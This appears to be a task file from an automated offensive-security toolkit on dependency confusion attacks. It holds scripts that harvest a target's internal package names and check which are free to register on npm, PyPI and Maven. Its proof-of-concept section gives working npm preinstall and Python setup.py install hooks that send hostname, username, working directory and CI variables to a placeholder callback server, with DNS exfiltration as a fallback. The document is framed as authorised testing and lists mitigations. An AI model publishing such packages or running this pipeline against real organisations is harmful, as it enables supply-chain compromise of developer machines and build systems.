@@ -1,0 +1,872 @@
+================================================================================
+TASK 91 - DEPENDENCY CONFUSION ATTACKS
+================================================================================
+Covers testing_toolkit.txt Phase 14 Step 46
+Supply chain attacks via package namespace squatting
+
+RCE ON BUILD = ULTIMATE PERSISTENCE
+If you can get your package pulled during build:
+- Code runs on developer machines
+- Code runs in CI/CD pipelines
+- Code runs on production build servers
+- Full infrastructure compromise possible
+
+================================================================================
+INPUTS
+================================================================================
+temp/agent1/js_files.txt                   <- JS files (package references)
+outputs/url_corpus_all_in_scope.txt        <- URLs (may contain repo refs)
+outputs/live_base_urls.txt                 <- Live hosts
+
+Look for manifest files if source available:
+- package.json (npm/yarn)
+- requirements.txt, Pipfile, setup.py (Python)
+- pom.xml, build.gradle (Java)
+- Gemfile (Ruby)
+- go.mod (Go)
+- composer.json (PHP)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/supply_chain/
+    internal_packages.txt                  <- Identified internal package names
+    confusion_candidates.txt               <- Packages that can be registered
+    namespace_analysis.txt                 <- Package namespace analysis
+    verified_vulnerable.txt                <- Confirmed vulnerable configs
+    poc_packages.txt                       <- PoC package details (if authorized)
+
+outputs/vulnerabilities/DEP-CONFUSION-*-CRITICAL.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+UNDERSTAND THE ATTACK:
+
+    How does dependency confusion work?
+    |
+    +-- Company uses internal package: @company/utils
+    +-- Package only exists on internal registry
+    +-- But pip/npm/maven ALSO checks public registry
+    +-- Attacker registers "company-utils" on public PyPI/npm
+    +-- Build system pulls attacker's package (higher version)
+    +-- Attacker's code executes during install
+
+    Why does this work?
+    |
+    +-- Package managers check multiple sources
+    +-- Public registries often checked first or alongside
+    +-- Higher version numbers win
+    +-- Install scripts run with full privileges
+    |
+    +-- TIMELINE OF REAL ATTACKS:
+        +-- 2021: Alex Birsan hits Apple, Microsoft, PayPal
+        +-- $130K+ in bounties from this single technique
+        +-- Hundreds of major companies vulnerable
+
+================================================================================
+PHASE 1: IDENTIFY INTERNAL PACKAGES
+================================================================================
+
+-----------------------------------------
+1.1 Extract Package Names from JS
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+extract_packages.py - Find internal package references in JS/source files
+
+Internal packages often have:
+- Company name prefix
+- @scope notation
+- Non-standard naming
+"""
+
+import re
+import os
+import json
+
+# Patterns for package references
+PATTERNS = {
+    'npm_require': r"require\(['\"](@?[\w\-./]+)['\"]\)",
+    'npm_import': r"import\s+.*?\s+from\s+['\"](@?[\w\-./]+)['\"]",
+    'npm_dynamic': r"import\(['\"](@?[\w\-./]+)['\"]\)",
+    'npm_scoped': r"@([\w\-]+)/([\w\-]+)",
+    'python_import': r"from\s+([\w_]+)\s+import",
+    'python_pip': r"^([\w\-_]+)==",
+    'maven_group': r"<groupId>([\w.\-]+)</groupId>",
+    'maven_artifact': r"<artifactId>([\w\-]+)</artifactId>",
+}
+
+# Known public packages to exclude
+PUBLIC_PACKAGES = {
+    'react', 'vue', 'angular', 'express', 'lodash', 'axios',
+    'jquery', 'moment', 'webpack', 'babel', 'typescript',
+    'requests', 'flask', 'django', 'numpy', 'pandas',
+    # Add more as needed
+}
+
+def extract_from_js(content):
+    """Extract package names from JavaScript"""
+    packages = set()
+    
+    for pattern_name, pattern in PATTERNS.items():
+        if 'npm' in pattern_name or 'import' in pattern_name:
+            matches = re.findall(pattern, content, re.MULTILINE)
+            for match in matches:
+                if isinstance(match, tuple):
+                    # Scoped package: @scope/name
+                    packages.add(f"@{match[0]}/{match[1]}")
+                else:
+                    packages.add(match)
+    
+    return packages
+
+def is_likely_internal(package_name):
+    """Heuristics to identify internal packages"""
+    
+    # Skip known public packages
+    base_name = package_name.split('/')[-1] if '/' in package_name else package_name
+    if base_name.lower() in PUBLIC_PACKAGES:
+        return False
+    
+    # Skip relative imports
+    if package_name.startswith('.'):
+        return False
+    
+    # Likely internal indicators
+    internal_indicators = [
+        # Company-specific prefixes (customize per target)
+        package_name.startswith('@'),  # Scoped packages often internal
+        '-internal' in package_name.lower(),
+        '-private' in package_name.lower(),
+        'company' in package_name.lower(),  # Replace with target name
+        '_' in package_name,  # Underscores less common in public npm
+    ]
+    
+    return any(internal_indicators)
+
+# Process all JS files
+os.makedirs('outputs/supply_chain', exist_ok=True)
+
+all_packages = set()
+internal_candidates = set()
+
+with open('temp/agent1/js_files.txt') as f:
+    js_files = [l.strip() for l in f if l.strip()]
+
+print(f"[*] Analyzing {len(js_files)} JS files for package references...")
+
+for js_file in js_files:
+    # Read JS file content (you'd fetch this from your corpus)
+    # For now, assume we have the content
+    try:
+        # This would be reading from your js_responses cache
+        with open(js_file) as f:
+            content = f.read()
+        
+        packages = extract_from_js(content)
+        all_packages.update(packages)
+        
+        for pkg in packages:
+            if is_likely_internal(pkg):
+                internal_candidates.add(pkg)
+                print(f"[+] Potential internal: {pkg}")
+                
+    except:
+        pass
+
+# Save findings
+with open('outputs/supply_chain/all_packages.txt', 'w') as f:
+    f.write('\n'.join(sorted(all_packages)))
+
+with open('outputs/supply_chain/internal_packages.txt', 'w') as f:
+    f.write('\n'.join(sorted(internal_candidates)))
+
+print(f"\n[*] Total packages found: {len(all_packages)}")
+print(f"[*] Potential internal packages: {len(internal_candidates)}")
+
+-----------------------------------------
+1.2 Extract from package.json (if accessible)
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+parse_package_json.py - Extract dependencies from package.json files
+"""
+
+import json
+import re
+import requests
+
+def analyze_package_json(url_or_content):
+    """Analyze package.json for internal dependencies"""
+    
+    if isinstance(url_or_content, str) and url_or_content.startswith('http'):
+        try:
+            resp = requests.get(url_or_content, timeout=10)
+            data = resp.json()
+        except:
+            return []
+    else:
+        data = json.loads(url_or_content)
+    
+    internal_deps = []
+    
+    # Check all dependency types
+    dep_keys = ['dependencies', 'devDependencies', 'peerDependencies', 'optionalDependencies']
+    
+    for key in dep_keys:
+        deps = data.get(key, {})
+        
+        for name, version in deps.items():
+            # Check for internal indicators
+            if any([
+                name.startswith('@'),  # Scoped
+                'internal' in name.lower(),
+                'private' in name.lower(),
+                # Check for non-standard version specs
+                version.startswith('file:'),
+                version.startswith('git+'),
+                'registry' in version,  # Custom registry
+            ]):
+                internal_deps.append({
+                    'name': name,
+                    'version': version,
+                    'type': key,
+                    'reason': 'Scoped/internal indicator'
+                })
+    
+    return internal_deps
+
+# Check common paths for package.json
+PACKAGE_JSON_PATHS = [
+    '/package.json',
+    '/frontend/package.json',
+    '/client/package.json',
+    '/web/package.json',
+    '/app/package.json',
+]
+
+# Would iterate through live_base_urls and check these paths
+
+================================================================================
+PHASE 2: CHECK PACKAGE AVAILABILITY
+================================================================================
+
+-----------------------------------------
+2.1 Check npm Registry
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+check_npm.py - Check if package names are available on npm
+"""
+
+import requests
+import json
+import time
+
+def check_npm_availability(package_name):
+    """Check if package exists on npm public registry"""
+    
+    # Handle scoped packages
+    if package_name.startswith('@'):
+        # @scope/name -> @scope%2fname
+        encoded = package_name.replace('/', '%2f')
+    else:
+        encoded = package_name
+    
+    url = f"https://registry.npmjs.org/{encoded}"
+    
+    try:
+        resp = requests.get(url, timeout=10)
+        
+        if resp.status_code == 404:
+            return {'available': True, 'reason': 'Package not found on npm'}
+        elif resp.status_code == 200:
+            data = resp.json()
+            return {
+                'available': False,
+                'reason': 'Package exists',
+                'latest_version': data.get('dist-tags', {}).get('latest'),
+                'maintainers': [m.get('name') for m in data.get('maintainers', [])]
+            }
+        else:
+            return {'available': 'unknown', 'reason': f'Status: {resp.status_code}'}
+            
+    except Exception as e:
+        return {'available': 'error', 'reason': str(e)}
+
+# Check all internal package candidates
+with open('outputs/supply_chain/internal_packages.txt') as f:
+    packages = [l.strip() for l in f if l.strip()]
+
+available_packages = []
+
+print(f"[*] Checking {len(packages)} packages on npm...")
+
+for pkg in packages:
+    result = check_npm_availability(pkg)
+    
+    if result['available'] == True:
+        print(f"[!!!] AVAILABLE: {pkg}")
+        available_packages.append(pkg)
+    else:
+        print(f"[-] Exists: {pkg}")
+    
+    time.sleep(0.5)  # Rate limit
+
+with open('outputs/supply_chain/confusion_candidates.txt', 'w') as f:
+    for pkg in available_packages:
+        f.write(f"{pkg}|npm|AVAILABLE\n")
+
+print(f"\n[*] {len(available_packages)} packages available for registration!")
+
+-----------------------------------------
+2.2 Check PyPI Registry
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+check_pypi.py - Check if package names are available on PyPI
+"""
+
+import requests
+import time
+
+def check_pypi_availability(package_name):
+    """Check if package exists on PyPI"""
+    
+    # PyPI normalizes names: underscores -> hyphens, lowercase
+    normalized = package_name.lower().replace('_', '-')
+    
+    url = f"https://pypi.org/pypi/{normalized}/json"
+    
+    try:
+        resp = requests.get(url, timeout=10)
+        
+        if resp.status_code == 404:
+            return {'available': True, 'reason': 'Package not found on PyPI'}
+        elif resp.status_code == 200:
+            data = resp.json()
+            return {
+                'available': False,
+                'reason': 'Package exists',
+                'latest_version': data.get('info', {}).get('version'),
+                'author': data.get('info', {}).get('author')
+            }
+        else:
+            return {'available': 'unknown', 'reason': f'Status: {resp.status_code}'}
+            
+    except Exception as e:
+        return {'available': 'error', 'reason': str(e)}
+
+# Extract Python package names
+python_packages = []
+
+# From requirements.txt patterns, setup.py, etc.
+# This would parse your discovered Python files
+
+-----------------------------------------
+2.3 Check Maven Central
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+check_maven.py - Check Maven Central for package availability
+"""
+
+import requests
+
+def check_maven_availability(group_id, artifact_id):
+    """Check if Maven artifact exists"""
+    
+    # Maven search API
+    url = f"https://search.maven.org/solrsearch/select?q=g:{group_id}+AND+a:{artifact_id}&rows=1&wt=json"
+    
+    try:
+        resp = requests.get(url, timeout=10)
+        data = resp.json()
+        
+        if data['response']['numFound'] == 0:
+            return {'available': True, 'reason': 'Not found on Maven Central'}
+        else:
+            doc = data['response']['docs'][0]
+            return {
+                'available': False,
+                'reason': 'Artifact exists',
+                'latest_version': doc.get('latestVersion'),
+                'group': doc.get('g')
+            }
+            
+    except Exception as e:
+        return {'available': 'error', 'reason': str(e)}
+
+================================================================================
+PHASE 3: ANALYZE PACKAGE MANAGER CONFIGS
+================================================================================
+
+-----------------------------------------
+3.1 Check .npmrc for Registry Config
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+analyze_npmrc.py - Check for insecure npm registry configurations
+"""
+
+import re
+
+# Dangerous patterns in .npmrc
+DANGEROUS_PATTERNS = {
+    'mixed_registries': r'registry\s*=.*\n.*@[\w\-]+:registry\s*=',
+    'no_scope_registry': r'^registry\s*=\s*https://registry\.npmjs\.org',
+    'always_auth_false': r'always-auth\s*=\s*false',
+}
+
+# Safe patterns
+SAFE_PATTERNS = {
+    'scoped_only': r'^@[\w\-]+:registry\s*=\s*https?://[^\n]+\n(?!registry\s*=)',
+    'always_auth': r'always-auth\s*=\s*true',
+}
+
+def analyze_npmrc(content):
+    """Analyze .npmrc for dependency confusion vulnerability"""
+    
+    issues = []
+    
+    # Check if public registry is configured alongside internal
+    if re.search(r'registry\.npmjs\.org', content):
+        if re.search(r'@[\w\-]+:registry', content):
+            issues.append({
+                'severity': 'HIGH',
+                'issue': 'Mixed registry configuration',
+                'detail': 'Public npm registry configured alongside scoped internal registry',
+                'risk': 'Unscoped packages will be fetched from public npm'
+            })
+    
+    # Check for missing always-auth
+    if not re.search(r'always-auth\s*=\s*true', content):
+        issues.append({
+            'severity': 'MEDIUM',
+            'issue': 'always-auth not enabled',
+            'detail': 'Authentication not enforced for registry access'
+        })
+    
+    return issues
+
+-----------------------------------------
+3.2 Check pip.conf / .pypirc
+-----------------------------------------
+# pip.conf dangerous patterns:
+# [global]
+# index-url = https://internal.company.com/pypi/simple
+# extra-index-url = https://pypi.org/simple  <- DANGER!
+
+# Safe pattern:
+# [global]
+# index-url = https://internal.company.com/pypi/simple
+# (no extra-index-url to public PyPI)
+
+================================================================================
+PHASE 4: CREATE PROOF OF CONCEPT (AUTHORIZED ONLY)
+================================================================================
+
+-----------------------------------------
+4.1 Create PoC npm Package
+-----------------------------------------
+# This creates a package that phones home during install
+# ONLY USE WITH AUTHORIZATION
+
+mkdir dependency-confusion-poc
+cd dependency-confusion-poc
+
+# package.json
+cat > package.json << 'EOF'
+{
+  "name": "INTERNAL-PACKAGE-NAME",
+  "version": "99.0.0",
+  "description": "Security research - dependency confusion PoC",
+  "scripts": {
+    "preinstall": "node poc.js"
+  },
+  "main": "index.js"
+}
+EOF
+
+# poc.js - Phone home script
+cat > poc.js << 'EOF'
+const https = require('https');
+const os = require('os');
+const { execSync } = require('child_process');
+
+// Collect environment info (non-destructive)
+const data = {
+  hostname: os.hostname(),
+  user: os.userInfo().username,
+  platform: os.platform(),
+  cwd: process.cwd(),
+  env_ci: process.env.CI || 'none',
+  env_github: process.env.GITHUB_ACTIONS || 'none',
+  timestamp: new Date().toISOString(),
+  package: 'INTERNAL-PACKAGE-NAME'
+};
+
+// Send to your callback server (Interactsh, Burp Collaborator, etc.)
+const payload = Buffer.from(JSON.stringify(data)).toString('base64');
+const callback = `https://YOUR-CALLBACK-SERVER.com/poc?data=${payload}`;
+
+https.get(callback, () => {}).on('error', () => {});
+
+// Also DNS exfil as backup
+try {
+  const dns = require('dns');
+  dns.lookup(`${os.hostname()}.dep-confusion.YOUR-CALLBACK-SERVER.com`, () => {});
+} catch(e) {}
+EOF
+
+# index.js - Innocent main file
+cat > index.js << 'EOF'
+module.exports = {};
+EOF
+
+# Publish (with authorization!)
+# npm publish --access public
+
+-----------------------------------------
+4.2 Create PoC Python Package
+-----------------------------------------
+# setup.py with install hook
+
+cat > setup.py << 'EOF'
+from setuptools import setup
+from setuptools.command.install import install
+import os
+import socket
+import urllib.request
+
+class PostInstall(install):
+    def run(self):
+        # Phone home
+        data = {
+            'hostname': socket.gethostname(),
+            'user': os.getenv('USER', 'unknown'),
+            'cwd': os.getcwd(),
+            'ci': os.getenv('CI', 'none'),
+            'package': 'INTERNAL-PACKAGE-NAME'
+        }
+        
+        try:
+            import json
+            import base64
+            payload = base64.b64encode(json.dumps(data).encode()).decode()
+            url = f'https://YOUR-CALLBACK-SERVER.com/poc?data={payload}'
+            urllib.request.urlopen(url, timeout=5)
+        except:
+            pass
+        
+        install.run(self)
+
+setup(
+    name='INTERNAL-PACKAGE-NAME',
+    version='99.0.0',
+    description='Security research',
+    cmdclass={'install': PostInstall},
+)
+EOF
+
+================================================================================
+PHASE 5: DETECTION WITHOUT EXPLOITATION
+================================================================================
+
+-----------------------------------------
+5.1 Using 'confused' Tool
+-----------------------------------------
+# confused - Dependency confusion checker by visma-prodsec
+# https://github.com/visma-prodsec/confused
+
+# Install
+pip install confused
+
+# Check npm project
+confused -p npm /path/to/package.json
+
+# Check Python project  
+confused -p pip /path/to/requirements.txt
+
+# Check multiple
+confused -p npm package.json -p pip requirements.txt
+
+-----------------------------------------
+5.2 Using depsconfusion
+-----------------------------------------
+# Another tool for detection
+# https://github.com/AetherBlack/depsconfusion
+
+python depsconfusion.py -f package.json -t npm
+python depsconfusion.py -f requirements.txt -t pip
+
+================================================================================
+PHASE 6: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+dependency_confusion_full.py - Complete dependency confusion assessment
+"""
+
+import os
+import re
+import json
+import requests
+import time
+
+os.makedirs('outputs/supply_chain', exist_ok=True)
+
+class DependencyConfusionScanner:
+    
+    def __init__(self):
+        self.internal_packages = []
+        self.available_packages = []
+        self.vulnerable_configs = []
+    
+    def extract_from_js_files(self, js_dir):
+        """Extract package references from JS files"""
+        
+        patterns = [
+            r"require\(['\"](@?[\w\-./]+)['\"]\)",
+            r"from\s+['\"](@?[\w\-./]+)['\"]",
+            r"import\(['\"](@?[\w\-./]+)['\"]\)",
+        ]
+        
+        packages = set()
+        
+        for root, dirs, files in os.walk(js_dir):
+            for file in files:
+                if file.endswith('.js') or file.endswith('.ts'):
+                    filepath = os.path.join(root, file)
+                    try:
+                        with open(filepath) as f:
+                            content = f.read()
+                        
+                        for pattern in patterns:
+                            matches = re.findall(pattern, content)
+                            packages.update(matches)
+                    except:
+                        pass
+        
+        return packages
+    
+    def identify_internal(self, packages, target_name):
+        """Identify likely internal packages"""
+        
+        internal = []
+        
+        for pkg in packages:
+            # Skip relative imports
+            if pkg.startswith('.'):
+                continue
+            
+            # Internal indicators
+            if any([
+                pkg.startswith('@') and target_name.lower() in pkg.lower(),
+                f'{target_name}-' in pkg.lower(),
+                f'{target_name}_' in pkg.lower(),
+                '-internal' in pkg.lower(),
+                '-private' in pkg.lower(),
+            ]):
+                internal.append(pkg)
+        
+        self.internal_packages = internal
+        return internal
+    
+    def check_npm(self, package_name):
+        """Check npm registry"""
+        
+        if package_name.startswith('@'):
+            encoded = package_name.replace('/', '%2f')
+        else:
+            encoded = package_name
+        
+        try:
+            resp = requests.get(
+                f"https://registry.npmjs.org/{encoded}",
+                timeout=10
+            )
+            return resp.status_code == 404
+        except:
+            return None
+    
+    def check_pypi(self, package_name):
+        """Check PyPI registry"""
+        
+        normalized = package_name.lower().replace('_', '-')
+        
+        try:
+            resp = requests.get(
+                f"https://pypi.org/pypi/{normalized}/json",
+                timeout=10
+            )
+            return resp.status_code == 404
+        except:
+            return None
+    
+    def find_available(self):
+        """Check which internal packages are available for registration"""
+        
+        for pkg in self.internal_packages:
+            print(f"[*] Checking: {pkg}")
+            
+            # Determine registry type
+            if pkg.startswith('@'):
+                available = self.check_npm(pkg)
+                registry = 'npm'
+            else:
+                # Try both
+                npm_avail = self.check_npm(pkg)
+                pypi_avail = self.check_pypi(pkg)
+                
+                if npm_avail:
+                    available = True
+                    registry = 'npm'
+                elif pypi_avail:
+                    available = True
+                    registry = 'pypi'
+                else:
+                    available = False
+                    registry = 'both'
+            
+            if available:
+                print(f"[!!!] AVAILABLE: {pkg} on {registry}")
+                self.available_packages.append({
+                    'package': pkg,
+                    'registry': registry,
+                    'status': 'AVAILABLE'
+                })
+            
+            time.sleep(0.5)  # Rate limit
+        
+        return self.available_packages
+    
+    def generate_report(self):
+        """Generate vulnerability report"""
+        
+        if not self.available_packages:
+            return
+        
+        for pkg_info in self.available_packages:
+            pkg = pkg_info['package']
+            registry = pkg_info['registry']
+            
+            report = f"""# Dependency Confusion Vulnerability
+
+**Severity**: CRITICAL
+**Package**: {pkg}
+**Registry**: {registry}
+
+## Description
+The internal package "{pkg}" is not registered on the public {registry} registry.
+An attacker could register this package name with a higher version number,
+causing build systems to pull the malicious package instead.
+
+## Impact
+- **RCE on Build**: Malicious code executes during package installation
+- **Developer Compromise**: Affects all developers who build the project
+- **CI/CD Compromise**: Affects build pipelines and deployment systems
+- **Supply Chain Attack**: Persistent backdoor in build process
+
+## Attack Scenario
+1. Attacker registers "{pkg}" on public {registry} with version 99.0.0
+2. Developer runs `npm install` or `pip install`
+3. Package manager fetches attacker's high-version package
+4. Install scripts execute attacker's code with developer privileges
+5. Attacker gains access to developer machine, secrets, source code
+
+## Recommendations
+1. **Register placeholder packages** on public registries
+2. **Configure package manager** to only use internal registry
+3. **Scope all internal packages** with organization prefix
+4. **Enable registry authentication** (always-auth in .npmrc)
+5. **Monitor for new packages** matching internal names
+
+## References
+- https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
+- https://blog.sonatype.com/dependency-confusion-copycat-attackers-going-after-your-pipeline
+"""
+            
+            safe_name = re.sub(r'[^\w\-]', '_', pkg)
+            with open(f"outputs/vulnerabilities/DEP-CONFUSION-{safe_name}-CRITICAL.md", 'w') as f:
+                f.write(report)
+    
+    def save_results(self):
+        """Save all results"""
+        
+        with open('outputs/supply_chain/internal_packages.txt', 'w') as f:
+            f.write('\n'.join(self.internal_packages))
+        
+        with open('outputs/supply_chain/confusion_candidates.txt', 'w') as f:
+            for pkg in self.available_packages:
+                f.write(f"{pkg['package']}|{pkg['registry']}|{pkg['status']}\n")
+        
+        with open('outputs/supply_chain/analysis.json', 'w') as f:
+            json.dump({
+                'internal_packages': self.internal_packages,
+                'available_packages': self.available_packages
+            }, f, indent=2)
+
+# Run
+if __name__ == "__main__":
+    scanner = DependencyConfusionScanner()
+    
+    # Extract packages from JS corpus
+    # scanner.extract_from_js_files('temp/agent1/js_responses')
+    
+    # Identify internal (replace 'company' with target)
+    # scanner.identify_internal(packages, 'targetcompany')
+    
+    # Check availability
+    # scanner.find_available()
+    
+    # Generate reports
+    # scanner.generate_report()
+    # scanner.save_results()
+    
+    print(f"\n{'='*60}")
+    print(f"[*] Internal packages found: {len(scanner.internal_packages)}")
+    print(f"[*] AVAILABLE FOR REGISTRATION: {len(scanner.available_packages)}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] Package references extracted from JS/source files
+[ ] Internal package naming patterns identified
+[ ] npm registry checked for availability
+[ ] PyPI registry checked for availability
+[ ] Maven Central checked (if Java detected)
+[ ] Package manager configs analyzed (.npmrc, pip.conf)
+[ ] Vulnerability reports generated
+[ ] (If authorized) PoC packages documented
+
+================================================================================
+TOOLS REFERENCE
+================================================================================
+
+DETECTION:
+- confused - Multi-language dependency confusion checker
+- depsconfusion - Alternative detection tool
+- Custom scripts for extraction
+
+REGISTRIES TO CHECK:
+- npm: registry.npmjs.org
+- PyPI: pypi.org
+- Maven Central: search.maven.org
+- RubyGems: rubygems.org
+- Packagist (PHP): packagist.org
+- Go Modules: proxy.golang.org
+
+SEVERITY: CRITICAL
+- RCE during build process
+- Affects entire development pipeline
+- Persistent supply chain compromise
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 92: Second-Order Attacks (stored payloads trigger elsewhere)
